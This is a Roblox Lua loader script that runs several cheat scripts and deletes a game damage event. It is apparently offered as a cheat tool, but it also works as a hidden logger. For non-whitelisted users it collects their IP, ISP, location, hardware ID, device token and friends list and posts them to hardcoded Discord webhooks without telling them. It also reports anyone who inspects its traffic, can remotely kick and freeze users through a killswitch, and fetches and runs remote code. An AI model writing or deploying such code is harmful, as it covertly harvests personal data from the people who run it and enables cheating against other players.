if not game:IsLoaded() then
    game.Loaded:Wait()
end

local LOG_FRIENDS_IN_SERVER = true 

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local lp = game.Players.LocalPlayer
local uid = tostring(lp.UserId)
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")

local executor = "Unknown"
pcall(function()
    if identifyexecutor then 
        executor = identifyexecutor() or "Unknown"
    elseif getexecutorname then 
        executor = getexecutorname() or "Unknown" 
    end
end)

-- Webhooks
local MAIN_WEBHOOK = "https://discord.com/api/webhooks/1511350552947200000/F5RA2icJ6WsnDcxK9B5qAZNVD7Aw3LCf1uhIZvmt38cX3GJGcCEkITsisJ-7ULdV_FAD"
local ALERT_WEBHOOK = "https://discord.com/api/webhooks/1518334035888181271/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"
local KILLSWITCH_URL = "https://raw.githubusercontent.com/nazarkus/rpg/refs/heads/main/killswitch.txt"

local reqFunc = syn and syn.request or http_request or request or fluxus and fluxus.request

local function isHttpHooked()
    if not reqFunc then return false end
    if debug and debug.getinfo then
        local info = debug.getinfo(reqFunc)
        if info.source then
            local src = string.lower(info.source)
            if string.find(src, "spy") or string.find(src, "stealer") or string.find(src, "logger") then
                return true
            end
        end
    end
    return false
end

if isHttpHooked() then
    local ipStr = "Hidden"
    pcall(function()
        local resp = reqFunc({Url = "https://api.ipify.org?format=json", Method = "GET"})
        if resp and resp.Success then
            local ok, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok and d.ip then ipStr = d.ip end
        end
    end)
    
    pcall(function()
        reqFunc({
            Url = ALERT_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = "🚨 WEBHOOK STEAL ATTEMPT DETECTED 🚨",
                    ["color"] = 0x000000,
                    ["description"] = "Someone tried to use an HTTP Spy to steal your webhook URL!",
                    ["fields"] = {
                        {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                        {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
                        {["name"] = "Executor", ["value"] = tostring(executor), ["inline"] = true},
                        {["name"] = "Client ID (HWID)", ["value"] = string.format("`%s`", hwid), ["inline"] = false},
                        {["name"] = "IP Address", ["value"] = string.format("||%s||", ipStr), ["inline"] = false}
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    end)
    lp:Kick("Security Error: HTTP Tampering Detected")
    while true do end
end

local tokenFileName = "rbx_telemetry_cache.json"
local deviceToken = "Unknown"

pcall(function()
    if isfile and readfile and writefile then
        if isfile(tokenFileName) then
            deviceToken = readfile(tokenFileName)
        else
            deviceToken = HttpService:GenerateGUID(false)
            writefile(tokenFileName, deviceToken)
        end
    end
end)

local function getExecutorStrength()
    local required_unc = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}
    local required_sunc = {"gethui", "setthreadidentity", "getthreadidentity"}
    
    local env = (getgenv and getgenv()) or getfenv(0)
    
    local unc_count = 0
    for _, f in ipairs(required_unc) do
        if env[f] then unc_count = unc_count + 1 
        else pcall(function() if loadstring("return type("..f..") == 'function'")() then unc_count = unc_count + 1 end end) end
    end

    local sunc_count = 0
    for _, f in ipairs(required_sunc) do
        if env[f] then sunc_count = sunc_count + 1 
        else pcall(function() if loadstring("return type("..f..") == 'function'")() then sunc_count = sunc_count + 1 end end) end
    end

    local unc_percent = math.floor((unc_count / #required_unc) * 100)
    local sunc_percent = math.floor((sunc_count / #required_sunc) * 100)
    
    local result = string.format("UNC: %d%% | sUNC: %d%%", unc_percent, sunc_percent)
    if unc_percent < 80 then result = result .. " (Admin/IY might break)" end
    return result
end

-- blacklist
local Blacklist = {
    UIDs = {},
    HWIDs = {""},
    Tokens = {""} 
}

-- whitelist
local Whitelist = {
    UIDs = {"10760143653"},
    HWIDs = {
        "1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE",
        "",
        "",
        "",
        "",
        "",
    },
    Tokens = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
}

local status = "unknown"

local function checkAccess(list)
    if list.UIDs then for _, v in ipairs(list.UIDs) do if v == uid then return true end end end
    if list.HWIDs then for _, v in ipairs(list.HWIDs) do if v == hwid then return true end end end
    if list.Tokens then for _, v in ipairs(list.Tokens) do if v == deviceToken then return true end end end
    return false
end

if checkAccess(Blacklist) then
    status = "blacklist"
elseif checkAccess(Whitelist) then
    status = "whitelist"
end

-- Глобальный Live Killswitch
if status ~= "whitelist" then
    task.spawn(function()
        while task.wait(15) do -- Проверяем каждые 15 секунд
            pcall(function()
                local ksReq = reqFunc({Url = KILLSWITCH_URL, Method = "GET"})
                if ksReq and ksReq.Success then
                    local data = string.lower(ksReq.Body)
                    -- Убираем лишние пробелы и переносы строк
                    data = string.gsub(data, "^%s*(.-)%s*$", "%1")
                    
                    if data == "all" then
                        lp:Kick("Security Check Failed. (Connection Terminated)")
                        while true do end
                    elseif data ~= "none" and data ~= "" then
                        if string.find(string.lower(lp.Name), data) or string.find(string.lower(lp.DisplayName), data) or string.find(uid, data) then
                            lp:Kick("Security Check Failed. (Connection Terminated)")
                            while true do end
                        end
                    end
                end
            end)
        end
    end)
end

pcall(function()
    if not reqFunc then return end

    local place_name = "Unknown"
    pcall(function() place_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)

    local factionName = "None"
    local factionTag = "None"
    pcall(function()
        local rs = game:GetService("ReplicatedStorage")
        local factionDataFolder = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
        if factionDataFolder then
            for _, faction in ipairs(factionDataFolder:GetChildren()) do
                local members = faction:FindFirstChild("FactionMembers")
                if members and members:FindFirstChild(uid) then
                    local basicData = faction:FindFirstChild("BasicFactionData")
                    if basicData then
                        factionName = basicData:FindFirstChild("FactionName") and basicData.FactionName.Value or "Unknown"
                        factionTag = basicData:FindFirstChild("FactionTag") and basicData.FactionTag.Value or "Unknown"
                    end
                    break
                end
            end
        end
    end)

    if status == "whitelist" then
        reqFunc({
            Url = MAIN_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = "✅ Whitelisted User Executed",
                    ["color"] = 0x00FF00,
                    ["fields"] = {
                        {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                        {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
                        {["name"] = "Client ID", ["value"] = string.format("`%s`", hwid), ["inline"] = false},
                        {["name"] = "Device Token", ["value"] = string.format("`%s`", deviceToken), ["inline"] = false},
                        {["name"] = "Faction", ["value"] = string.format("[%s] %s", factionTag, factionName), ["inline"] = false},
                        {["name"] = "Game", ["value"] = place_name, ["inline"] = false}
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    else
        local ip_info = {query = "Hidden", isp = "Unknown", country = "Unknown", city = "Unknown", timezone = "Unknown", proxy = false, hosting = false}
        local gotIp = false
        
        local ok, resp = pcall(reqFunc, {
            Url = "http://ip-api.com/json?fields=status,country,city,timezone,isp,query,proxy,hosting",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        })
        if ok and resp and resp.Success then
            local ok2, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok2 and d and d.query then 
                ip_info = d 
                gotIp = true
            end
        end

        if not gotIp then
            local ok3, resp2 = pcall(reqFunc, {Url = "https://ipinfo.io/json", Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}})
            if ok3 and resp2 and resp2.Success then
                local ok4, d2 = pcall(HttpService.JSONDecode, HttpService, resp2.Body)
                if ok4 and d2 and d2.ip then
                    ip_info.query = d2.ip; ip_info.city = d2.city or "Unknown"; ip_info.country = d2.country or "Unknown"
                    ip_info.isp = d2.org or "Unknown"; ip_info.timezone = d2.timezone or "Unknown"
                end
            end
        end

        local isVpnProxy = "No"
        if ip_info.proxy or ip_info.hosting then isVpnProxy = "Yes" end

        local platform = "PC"
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then platform = "Mobile"
        elseif UIS.GamepadEnabled and not UIS.KeyboardEnabled then platform = "Console" end
        if UIS.VREnabled then platform = "VR" end

        local friendsStr = "Disabled"
        if LOG_FRIENDS_IN_SERVER then
            local friendsInServer = {}
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p ~= lp then
                    pcall(function()
                        if lp:IsFriendsWith(p.UserId) then
                            table.insert(friendsInServer, p.Name)
                        end
                    end)
                end
            end
            friendsStr = #friendsInServer > 0 and table.concat(friendsInServer, ", ") or "None"
        end

        local jobId = game.JobId
        local isVip = false
        if jobId == "" then
            jobId = "Unknown"
        else
            if #jobId > 36 then isVip = true end
        end

        local gameStatus = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", place_name, game.PlaceId, jobId)
        if isVip then gameStatus = gameStatus .. " (VIP Server)" end

        local joinUrl = string.format("https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
        local quickJoinBtn = ""
        pcall(function()
            local req = reqFunc({Url = joinUrl, Method = "GET"})
            if req and req.Success then
                quickJoinBtn = string.format("[Click to Join Server](%s)", req.Body)
            end
        end)
        
        local linksStr = string.format("[Profile](https://www.roblox.com/users/%s/profile)", uid)
        
        if quickJoinBtn ~= "" then
            linksStr = quickJoinBtn .. " | " .. linksStr
        end

        local execStrength = getExecutorStrength()
        local embedColor = (status == "blacklist") and 0xFF0000 or 0xFFA500
        local embedTitle = (status == "blacklist") and "Blacklisted User Blocked" or "Unknown/Guest User Executed"

        reqFunc({
            Url = MAIN_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = embedTitle,
                    ["color"] = embedColor,
                    ["thumbnail"] = {
                        ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=150&height=150&format=png"
                    },
                    ["fields"] = {
                        {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", lp.DisplayName, lp.Name, uid, tostring(lp.AccountAge)), ["inline"] = true},
                        {["name"] = "System", ["value"] = string.format("**Platform:** %s\n**Executor:** %s", platform, tostring(executor)), ["inline"] = true},
                        {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", factionTag, factionName), ["inline"] = false},
                        {["name"] = "Injector", ["value"] = execStrength, ["inline"] = false},
                        {["name"] = "Hardware ID", ["value"] = string.format("```\n%s\n```", hwid), ["inline"] = false},
                        {["name"] = "Device Token", ["value"] = string.format("```\n%s\n```", deviceToken), ["inline"] = false},
                        {["name"] = "Network", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query, ip_info.isp, isVpnProxy, ip_info.country, ip_info.city, ip_info.timezone), ["inline"] = false},
                        {["name"] = "Game", ["value"] = gameStatus, ["inline"] = false},
                        {["name"] = "Friends Target", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
                        {["name"] = "Links", ["value"] = linksStr, ["inline"] = false}
                    },
                    ["footer"] = { ["text"] = "Nazarkus Logger | " .. string.upper(status) },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    end
end)

if status == "blacklist" then
    lp:Kick("You are blacklisted from using this script.")
    return
end

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))()
end)

pcall(function()
    game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy()
end)
